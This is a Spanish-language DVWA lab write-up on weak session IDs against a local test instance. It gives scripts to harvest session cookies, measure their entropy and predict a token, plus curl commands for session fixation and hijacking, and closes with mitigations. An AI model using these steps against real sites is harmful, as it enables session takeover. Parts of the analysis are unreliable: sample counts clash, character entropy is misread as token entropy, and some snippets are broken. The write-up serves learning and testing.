# 🛡️ WEAK SESSION IDS — DVWA

## 1. ¿Qué es Weak Session ID?

Una aplicación vulnerable a *Weak Session IDs* genera identificadores de sesión **predecibles**, **repetitivos** o con **poca entropía**. Esto permite a un atacante:

- **Adivinar** un ID válido.
- **Forzar** a la víctima a usar un ID que él controla (*session fixation*).
- **Reutilizar** un ID robado para suplantar al usuario (*session hijacking*).

🔐 **Riesgo principal**: secuestro de sesión sin necesidad de conocer credenciales.

---

## 📚 Glosario técnico

- **ID de sesión**: Cadena única que vincula tu navegador con tu sesión autenticada en el servidor.
- **Entropía**: Medida de aleatoriedad. Cuanta menos entropía, más fácil es predecir un valor.
- **PRNG (Pseudo-Random Number Generator)**: Algoritmo que genera números aparentemente aleatorios. Si está mal sembrado (mal *seed*), puede producir patrones repetitivos.
- **Session fixation**: Técnica en la que el atacante fuerza a la víctima a usar un ID de sesión que él conoce, para luego reutilizarlo.
- **Session hijacking**: Técnica para robar o adivinar un ID de sesión válido y tomar control de la sesión del usuario.
- **Set-Cookie**: Cabecera HTTP que el servidor usa para enviar cookies al navegador.
- **PHPSESSID**: Nombre típico del identificador de sesión en aplicaciones PHP como DVWA.

---

## 2. Entorno de pruebas

- **Aplicación**: DVWA (Damn Vulnerable Web Application)
- **URL base**: `http://127.0.0.1:8080/`
- **Módulo**: `Vulnerabilities → Weak Session IDs`
- **URL específica**: `http://127.0.0.1:8080/vulnerabilities/weak_id/`
- **Usuario**: Autenticado como `admin`
- **Nivel de seguridad**: Low / Medium / High (según tramo)

📝 *Nota*: En DVWA, cada recarga de la página suele generar un nuevo ID de sesión. Esto se puede aprovechar para capturar múltiples IDs usando `curl`.

---

## 3. Quickstart (Low): Cosecha y análisis de IDs

### 3.1 Crear carpeta de trabajo

```bash
mkdir -p ~/Pentesting/DVWA/weakid
cd ~/Pentesting/DVWA/weakid
```

### 3.2 Capturar IDs (1000 muestras

Creamos un scrip en Bash llamado `capturar_ids.sh` que:

- Simula múltiples sesiones en DVWA.
- Captura 1000 respuestas del módulo Weak Session IDs.
- Extrae los valores de `PHPSESSID` desde la cabecera `Set-Cookie`.
- Guarda los tokens en bruto y los filtra.
- Evalúa su entropía y unicidad.
- Prepara los datos para análisis posterior con Python u otras herramientas.

⚠️ Recuerda ajustar el valor de tu cookie si estás autenticado, aunque en este script no se usa una cookie previa.

#### 📄 Script: capturar_ids.sh

```bash
#!/bin/bash

URL='http://127.0.0.1:8080/vulnerabilities/weak_id/'
> tokens_raw.txt

for i in $(seq 1 1000); do
  # Realiza la petición y captura la cabecera Set-Cookie
  token=$(curl -s -D - "$URL" -o /dev/null | grep -i 'Set-Cookie:' | grep -o 'PHPSESSID=[^;]*' | cut -d= -f2)
  
  # Guarda el token si existe
  if [[ -n "$token" ]]; then
    echo "$token" >> tokens_raw.txt
  fi
done

# Normalizamos: 1 token por línea (filtramos vacíos)
grep -E '\S' tokens_raw.txt > tokens.txt

echo "[*] Tokens capturados: $(wc -l < tokens.txt)"
echo "[*] Únicos: $(sort tokens.txt | uniq | wc -l)"
```

#### 🧾 Explicación línea por línea del script

```bash
#!/bin/bash
```

- **Shebang:** Indica que el script se ejecuta con Bash.

```bash
URL='http://127.0.0.1:8080/vulnerabilities/weak_id/'
```

- Define la URL del módulo vulnerable.

```bash
> tokens_raw.txt
```

- Vacía el archivo `tokens_raw.txt` si existe.

```bash
for i in $(seq 1 1000); do
```

- Bucle que se repite 1000 veces.

```bash
token=$(curl -s -D - "$URL" -o /dev/null | grep -i 'Set-Cookie:' | grep -o 'PHPSESSID=[^;]*' | cut -d= -f2)
```

- `curl -s -D -`: hace una petición silenciosa y muestra las cabeceras.
- `-o /dev/null`: descarta el cuerpo de la respuesta.
- `grep -i 'Set-Cookie:'`: busca la cabecera que contiene la cookie.
- `grep -o 'PHPSESSID=[^;]*'`: extrae el valor del ID.
- `cut -d= -f2`: elimina el prefijo `PHPSESSID=`.

```bash
if [[ -n "$token" ]]; then
  echo "$token" >> tokens_raw.txt
fi
```

- Si el token no está vacío, lo guarda.

```bash
done
```

- Cierra el bucle.

```bash
grep -E '\S' tokens_raw.txt > tokens.txt
```

- Filtra líneas no vacías y guarda en `tokens.txt`.

```bash
echo "[*] Tokens capturados: $(wc -l < tokens.txt)"
echo "[*] Únicos: $(sort tokens.txt | uniq | wc -l)"
```

- Muestra el total de tokens y cuántos son únicos.

#### 🧪 Ejecución del script

```bash
chmod +x capturar_ids.sh
./capturar_ids.sh
```

Esto ejecutará el script, guardará los tokens en `tokens.txt` y mostrará estadísticas básicas.

#### 📊 Análisis de resultados

<img width="356" height="79" alt="imagen" src="https://github.com/user-attachments/assets/eb36398e-6be6-4efa-89f0-7c861a78a665" />

| Métrica |	Valor	| Interpretación |
| muestras |	2000 tokens capturados |	Buen tamaño para análisis estadístico |
| únicos |	1000 tokens únicos | 50% de colisiones. Muy inseguro |

Este resultado indica que DVWA en nivel Low genera IDs de sesión repetitivos y predecibles, lo que representa una vulnerabilidad grave.


### 3.3 Analizamos entropía, longitud y colisiones

Una vez capturados los tokens, analizamos su calidad como identificadores de sesión. Para ello, creamos un script en Python llamado `analyze_weakids.py` que evalúa:

- Número total de muestras.
- Número de tokens únicos (colisiones).
- Longitud media de los tokens.
- Entropía media por token y por carácter.
- Conjunto de caracteres utilizados.

---

#### 🐍 Script: `analyze_weakids.py`

```python
#!/usr/bin/env python3
import math, sys, re
from collections import Counter

data = [line.strip() for line in sys.stdin if line.strip()]
n = len(data)
unique = len(set(data))
lengths = [len(x) for x in data]
avg_len = sum(lengths)/n if n else 0

# entropía de Shannon por carácter (aprox)
def shannon(s):
    c = Counter(s)
    p = [cnt/len(s) for cnt in c.values()]
    return -sum(pi*math.log2(pi) for pi in p)

# promedio de entropía por token y por carácter
H_tokens = sum(shannon(x) for x in data)/n if n else 0
H_per_char = sum(shannon(x)/len(x) for x in data)/n if n else 0

# conjunto de caracteres
charset = sorted(set("".join(data)))
print(f"muestras={n}")
print(f"unicos={unique}  (colisiones={n-unique})")
print(f"longitud_media={avg_len:.2f}")
print(f"entropia_media_token={H_tokens:.2f} bits")
print(f"entropia_media_por_caracter={H_per_char:.3f} bits/car")
print(f"charset={''.join(charset)}")
```

#### 🧾 Explicación línea por línea del script de python analyze_weakids.py

##### 🔧 Cabecera del script

```Python
#!/usr/bin/env python3
```

- Indica que el script desde ejecutarse con Python 3.
- Permite que el archivo se ejecute directamente como un programa.

##### 📦 Importación de módulos

```Python
import math, sys, re
from collections import Counter
```

- math: para cálculos matemáticos como logaritmos.
- sys: para leer entrada estándar (stdin).
- re: para expresiones regulares.
- Counter: para contar ocurrencias de caracteres en cada token.

##### 📥 Lectura de datos

```Python
data = [line.strip() for line in sys.stdin if line.strip()]
```

- Lee cada línea del archivo tokens.txt desde la entrada estándar.
- line.strip(): elimina espacios o saltos de línea.
- Filtra líneas vacías.

##### 📊 Métricas básicas

```Python
n = len(data)
unique = len(set(data))
lengths = [len(x) for x in data]
avg_len = sum(lengths)/n if n else 0
```

- n: número total de tokens capturados.
- unique: número de tokens únicos (sin duplicados).
- Calcula la longitud de cada token.
- avg_len: longitud media de los tokens.

##### 🔐 Entropía de Shannon

```Python
def shannon(s):
    c = Counter(s)
    p = [cnt/len(s) for cnt in c.values()]
    return -sum(pi*math.log2(pi) for pi in p)
```

- shannon(s): calcula la entropía de Shannon de un string s.
- Counter(s): cuenta cuántas veces aparece cada carácter.
- p: lista de probabilidades de cada carácter.
- -sum(...): fórmula de entropía.

                H=−∑pilog⁡2piH = -\sum p_i \log_2 p_i

##### 📊 Entropía total y por carácter

```Python
H_tokens = sum(shannon(x) for x in data)/n if n else 0
H_per_char = sum(shannon(x)/len(x) for x in data)/n if n else 0
```

- H_tokens: entropía media por token completo.
- H_per_char: entropía media por carácter.

##### 🔤 Conjunto de caracteres usados

```Python
charset = sorted(set("".join(data)))
```

- Une todos los tokens en una sola cadena.
- Extrae los caracteres únicos.
- Los ordena alfabéticamente.

##### 📋 Resultados en pantalla

```Python
print(f"muestras={n}")
print(f"unicos={unique}  (colisiones={n-unique})")
print(f"longitud_media={avg_len:.2f}")
print(f"entropia_media_token={H_tokens:.2f} bits")
print(f"entropia_media_por_caracter={H_per_char:.3f} bits/car")
print(f"charset={''.join(charset)}")
```

- muestras: total de tokens analizados.
- unicos: cuántos son distintos.
- colisiones: cuántos se repiten.
- longitud_media: promedio de longitud.
- entropía: mide cuán impredecibles son los tokens.
- charset: muestra qué caracteres se usan (por ejemplo, sólo números, hexadecimales, etc).

##### ▶️ Ejecución del script

```bash
python analyze_weakids.py < tokens.txt
```

Este comando redirige el contenido de tokens.txt como entrada estándar al script.

### 📊 Análisis de los resultados

<img width="359" height="129" alt="imagen" src="https://github.com/user-attachments/assets/f43e3619-0f71-40c6-b736-c3bdb1ab5c02" />

| Métrica                          | Valor                                 | Interpretación                                      |
|----------------------------------|---------------------------------------|-----------------------------------------------------|
| muestras=2000                   | 2000 tokens capturados                | Buen tamaño para análisis estadístico              |
| unicos=1000                     | 1000 tokens únicos                    | ¡50% colisiones! Muy inseguro                      |
| colisiones=1000                 | 1000 tokens repetidos                 | IDs se repiten con frecuencia                      |
| longitud_media=26.00           | 26 caracteres por token               | Relativamente corto                                |
| entropia_media_token=4.02      | 4.02 bits por token                   | Extremadamente baja (debería estar >128 bits)      |
| entropia_media_por_caracter=0.155 | Muy baja por carácter               | Tokens predecibles                                 |
| charset=0123456789abcdefghijklmnopqrstuv | Solo 32 caracteres usados     | No hay mayúsculas, símbolos, ni alta variabilidad |


### 🔐 ¿Qué significa esto?

Tras ejecutar el análisis con `analyze_weakids.py`, se confirma que:

- **IDs de sesión en nivel Low son débiles:** se repiten, tienen poca variabilidad, y podrían ser adivinados por un atacante.
- **Entropía baja = predictibilidad alta:** un atacante podría generar tokens válidos por fuerza bruta.
- **Colisiones del 50%:** significa que el servidor está reutilizando IDs o generándolos con un algoritmo pobre.

### 📌 Interpretación (Low)

- Si observamos **muchas colisiones** o **patrones evidentes** (por ejemplo, números que incrementan, hexadecimales que cambian solo el final), el sistema es vulnerable.
- Una **entropía por carácter baja** (muy por debajo de ~5–6 bits/car para un charset alfanumérico amplio) es una señal clara de debilidad.

---

## 3.4 Heurística de predicción (Low)

### ✅ ¿Qué hace este script?

Este script busca detectar patrones numéricos en los tokens para predecir el siguiente

- Convierte los tokens hexadecimales a enteros.
- Calcula las diferencias entre ellos (deltas).
- Detecta el delta más frecuente.
- Predice el siguiente valor.
- Lo convierte de nuevo a hexadecimal.
- Te da el posible siguiente token para probar en DVWA.

---

### 🛠️ Creación del script

Creamos el archivo con `nano`:

```bash
nano prediccion_low.sh
```

Contenido del script:

```bash
  # Si parecen hex de 32 chars, conviértelos a enteros y mira diferencias
awk '
/^[0-9a-fA-F]{32}$/ {
  cmd="python3 - <<PY\nprint(int(\""$0"\",16))\nPY"
  cmd | getline v
  close(cmd)
  print v
}' tokens.txt > tokens_int.txt 2>/dev/null

if [ -s tokens_int.txt ]; then
  echo "[*] Analizando deltas..."
  paste tokens_int.txt <(tail -n +2 tokens_int.txt) \
    | awk '{if(NR>1) print $2-$1}' | head
fi
```

3. Damos permisos y lo ejecutamos:

```bash
chmod +x prediccion_low.sh
./prediccion_low.sh
```

## 🧾 Explicación línea por línea del script 

### 🔍 Conversión de tokens hexadecimales

```Bash
awk '
/^[0-9a-fA-F]{32}$/ {
```

- **awk:** herramienta para procesar texto línea por línea.
- **/^[0-9a-fA-F]{32}$/:** filtra líneas que sean exactamente de 32 caracteres hexadecimales (como un hash MD5).

```Bash
cmd="python3 - <<PY\nprint(int(\""$0"\",16))\nPY"
```

- Contruye un comando en Bash que ejecuta Python.
- **int("$0", 16):** convierte el token hexadecimal a un número entero.
- **"$0":** representa la línea actual (el token).

```bash
cmd | getline v
close(cmd)
```

- Ejecuta el comando Python y guarda el resultado en la variable v.
- Cierra el comando para liberar recursos.

```Bash
print v
}'
```

- Imprime el número entero resultante.
- El resultado se guarda en tokens_int.txt.

```bash
> tokens_int.txt 2>/dev/null
```

- Redirecciona la salida del script a tokens_int.txt.
- 2>/dev/null: oculta cualquier mensaje de error.

### 📊 Análisis de deltas 

```bash
if [ -s tokens_int.txt ]; then
```

- Verifica si el archivo tokens_int.txt **no está vacío**.

```bash
echo "[*] Analizando deltas..."
```

- Muestra un mensaje indicando que empieza el análisis.

```bash
paste tokens_int.txt <(tail -n +2 tokens_int.txt) \
| awk '{if(NR>1) print $2-$1}' | head
```

- **paste:** combina dos archivos línea por línea.
  - El primero: tokens_int.txt
  - El segundo: tail -n +2 tokens_int.txt → todas las líneas excepto la primera.
- Resultado: pares consecutivos de números.
- awk '{if(NR>1) print $2-$1}': calcula la diferencia entre cada par (delta).
- head: muestra solo los primeros resultados.

## 📉 Resultado y diagnóstico

<img width="432" height="63" alt="imagen" src="https://github.com/user-attachments/assets/e5df7319-f7ee-49ef-bbb7-f93342250d00" />

Este script busca tokens hexadecimales de 32 caracteres, pero según el análisis previo:

- **Logitud meedia:** 26 caracteres -> no son de 32.
- **Charset:** 0123456789abcdefghijklmnopqrstuv → no es puro hexadecimal (0-9a-f).
- **Entropía baja:** 4.03 bits por token → muy predecibles.
- **Colisiones:** 1000 tokens repetidos entre 2000 → ¡esto es una pista brutal!

## 🧠 Conclusión

El script `prediccion_low.sh` no encontró tokens válidos porque ninguno cumple con el patrón de 32 caracteres hexadecimales. No es un error del script, sino una mala suposición sobre el formato de los tokens generados por DVWA en nivel Low.

Esto demuestra que antes de aplicar heurísticas de predicción, es fundamental analizar el formato real de los datos. En este caso, los tokens no son hashes ni UUIDs, sino cadenas alfanuméricas simples y repetitivas.


## 🧠 ¿Qué podemos hacer en este caso?

Los tokens generados por DVWA en nivel *Low* tienen:

- Longitud fija de **26 caracteres**.
- Un **charset limitado** (`0123456789abcdefghijklmnopqrstuv`).
- Baja entropía y muchas colisiones.

Esto sugiere que no son hashes hexadecimales de 32 caracteres, sino cadenas alfanuméricas simples. Por tanto, debemos adaptar nuestra heurística de predicción.


### 🔄 Alternativa: Predicción en base 32

En lugar de modificar el script anterior, creamos uno nuevo que:

- Convierte los tokens a enteros usando **base 32**.
- Calcula los **deltas** entre ellos.
- Detecta el **delta más frecuente**.
- Predice el siguiente valor.
- Lo convierte de nuevo a base 32.
- Sugiere un posible token para probar en DVWA.

---

#### 🛠️ 1. Crear archivo con `nano`

```bash
nano prediccion_low_base32.sh
```

#### 📄 2. Contenido del script

```Bash
#!/bin/bash

# Convertir tokens de 26 caracteres al entero usando base 32
awk 'length($0)==26 {
  cmd="python3 -c '\''print(int(\""$0"\", 32))'\''"
  cmd | getline v
  close(cmd)
  print v
}' tokens.txt > tokens_int_base32.txt 2>/dev/null

# Verificar si hay datos
if [ -s tokens_int_base32.txt ]; then
  echo "[*] Tokens convertidos a enteros (base 32): $(wc -l < tokens_int_base32.txt)"

  # Calcular deltas
  paste tokens_int_base32.txt <(tail -n +2 tokens_int_base32.txt) \
    | awk '{if(NR>1) print $2-$1}' > deltas_base32.txt

  echo "[*] Primeros deltas:"
  head deltas_base32.txt

  # Detectar delta más frecuente
  delta_frecuente=$(sort deltas_base32.txt | uniq -c | sort -nr | head -n1 | awk '{print $2}')
  ultimo_valor=$(tail -n1 tokens_int_base32.txt)
  siguiente_valor=$((ultimo_valor + delta_frecuente))

  echo "[*] Delta más frecuente: $delta_frecuente"
  echo "[*] Último valor: $ultimo_valor"
  echo "[*] Predicción siguiente valor: $siguiente_valor"

  # Convertir a base 32
  siguiente_token=$(python3 -c "import numpy; print(numpy.base_repr($siguiente_valor, 32).lower().zfill(26))")
  echo "[*] Posible siguiente token (base32): $siguiente_token"
else
  echo "[!] No se encontraron tokens válidos de 26 caracteres en tokens.txt"
fi
```

#### ▶️ 3. Dar permisos y ejecutar

```bash
chmod +x prediccion_low_base32.sh
./prediccion_low_base32.sh
```

## 📊 Lo que hemos descubierto

<img width="520" height="305" alt="imagen" src="https://github.com/user-attachments/assets/6dd45880-ab68-48de-9067-0dcd0ee7d581" />

- Hemos convertido los tokens a enteros en base32.
- Calculamos los deltas entre ellos.
- El ***delta más frecuente es 0***, lo que significa que ***muchos tokens se repiten exactamente***.
- El token predicho es:

```Codigo
00000000000004n0rcsjvnd4o5
```

### 🔐 ¿Qué significa esto?

- DVWA en nivel Low está generando tokens que ***se repiten*** o que tienen ***saltos enormes y erráticos*** entre ellos.
- El hecho de que el delta más frecuente sea 0 indica que la ***mitad de los tokens son duplicados exactos.***
- Esto hace que un atacante pueda ***adivinar o reutilizar tokens*** para secuestrar sesiones.

## 🧪 ¿Qué puedes hacer ahora?

### ✅ Probar el token predicho

1. Abre DVWA en el navegador.
2. Ve a herramientas del desarrollador (F12) -> pestaña "Storage" o "Cookies".
3. Localiza la cookie PHPSESSID.
4. Sustitúyela por el token predicho:

```codigo
00000000000004n0rcsjvnd4o5
```

5. Recarga la página y observa si accedes a una sesión válida.

Si lo haces justo después de que otro usuario haya usado ese token, podrías secuestrar su sesión.
⚠️ Asegúrate de que el charset realmente encaje con base 32. Si hay letras fuera del rango a-v, podrías necesitar base 36.

### 🔁 Repetir el análisis de deltas

Una vez convertidos a enteros, puedes usar el mismo bloque para calcular deltas y buscar patrones:

```bash
paste tokens_int.txt <(tail -n +2 tokens_int.txt) \
  | awk '{if(NR>1) print $2-$1}' | sort | uniq -c | sort -nr | head
```

### 🔮 Intentar predecir el siguiente token

Si detectamos un delta repetido, podemos:

- Tomar el último entero.
- Sumar el delta.
- Convertirlo de nuevo a base32 o base 36.

```bash
python3 -c 'print(base_repr(VALOR, 32))'
```

Para esto, puedes usar numpy.base_repr() o escribir una función personalizada si no tienes NumPy instalado.


## 4 Medium

Repetimos la cosecha cambiando a security=medium.

```bash
COOKIE='PHPSESSID=TUCOKIEAQUI; security=medium'
# Repite el bucle de captura (quizás 2000 muestras)
```

En Medium suele mejorar la aleatoriedad (otro PRNG/semilla). Vuelve a ejecutar el análisis y compara métricas (sube la entropía, bajan colisiones).

## 5 High (y pruebas de fijación/hijacking)

Con security=high, DVWA normalmente utiliza IDs robustos. Aun así, prueba session fixation:

1. Fijar una cookie "a mano" (suponiendo que la app aceptara el valor que impones):

```bash
curl -i -s \
  -b 'PHPSESSID=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' \
  'http://127.0.0.1:8080/login.php' | head
```

- Si la app acepta el ID que tú fijas (sin regenerarlo al login), es vulnerable a fixation.
- Si regenera (te devuelve Set-cookie con uno nuevo), bien.

2. Hijacking (solo educativo): si hubieras predicho un ID válido de otra sesión, podrías:

```bash
curl -I -s \
  -b "PHPSESSID=ID_PREDICHO" \
  'http://127.0.0.1:8080/index.php'
```

Si devuelve contenido autenticado, es crítico.

DVWA en High debería regenerar IDs al autenticarse y no aceptar valores inyectados.

## 6 Mitigaciones 

- Generar IDs con CSPRNG (seguro criptográficamente).

- Regenerar ID tras login/privilege change (session_regenerate_id(true)).

- Activar session.use_strict_mode=1 (PHP).

- Cookies con HttpOnly, Secure, SameSite=Lax/Strict.

- Expirar y rotar sesiones; atarlas a IP/UA con cautela.

- Monitorear colisiones e intentos anómalos.

## 7 Scripts 

harvest_wekids.sh

```bash
#!/usr/bin/env bash
set -euo pipefail
COOKIE=${COOKIE:-'PHPSESSID=TUCOKIEAQUI; security=low'}
URL=${URL:-'http://127.0.0.1:8080/vulnerabilities/weak_id/'}
N=${N:-1000}

mkdir -p pages
: > tokens_raw.txt

for i in $(seq 1 "$N"); do
  html=$(curl -s -b "$COOKIE" "$URL")
  printf '%s\n' "$html" > "pages/page_$i.html"
  printf '%s\n' "$html" \
    | grep -Eo '\b[0-9a-fA-F]{32}\b' \
    || printf '%s\n' "$html" | grep -Eo '\b[A-Za-z0-9+/=]{20,}\b' \
    || printf '%s\n' "$html" | grep -Eo '\b[0-9]{6,}\b' \
    >> tokens_raw.txt
  (( i % 100 == 0 )) && echo "[*] $i"
done

grep -E '\S' tokens_raw.txt > tokens.txt
echo "[*] Capturados: $(wc -l < tokens.txt)  Únicos: $(sort tokens.txt | uniq | wc -l)"
```
